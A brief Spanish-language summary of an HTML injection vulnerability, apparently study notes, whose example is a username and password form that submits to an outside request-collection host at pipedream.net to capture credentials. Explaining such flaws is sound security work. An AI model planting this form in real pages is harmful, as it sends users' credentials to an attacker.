- --
###  Resumen de la Vulnerabilidad: HTML Injection

#### 💡 Ejemplo de Explotación
El código HTML mostrado en la imagen se puede insertar en una página vulnerable para capturar credenciales:
```html
<form action="https://eo2iwcccmp2l4wb.m.pipedream.net" method="GET">
    <input type="text" name="username" hidden>
    <input type="password" name="password" hidden>
    <button type="submit">Click me</button>
</form>
```

---
